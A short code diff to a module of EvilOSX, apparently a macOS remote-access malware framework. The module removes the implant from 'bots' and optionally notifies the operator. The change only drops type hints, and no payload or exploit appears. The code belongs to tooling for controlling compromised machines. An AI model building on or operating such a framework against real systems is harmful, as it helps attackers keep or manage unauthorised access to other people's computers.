@@ -6,7 +6,7 @@ from server.modules.helper import *
 
 
 class Module(ModuleABC):
-    def get_info(self) -> dict:
+    def get_info(self):
         return {
             "Author:": ["Marten4n6"],
             "Description": "Remove EvilOSX from the bot.",
@@ -14,12 +14,12 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def get_setup_messages(self) -> List[str]:
+    def get_setup_messages(self):
         return [
             "Notify when the bot is removed? [y/N]: "
         ]
 
-    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+    def setup(self, set_options):
         should_continue = self._view.should_continue([
             "You are about to remove EvilOSX from the bot(s)."
         ])
@@ -39,7 +39,7 @@ class Module(ModuleABC):
                 }
             }
 
-    def process_response(self, response: bytes, response_options: dict):
+    def process_response(self, response, response_options):
         if response_options["should_notify"]:
             self._view.output_separator()
             self._view.output(response.decode(), "info")
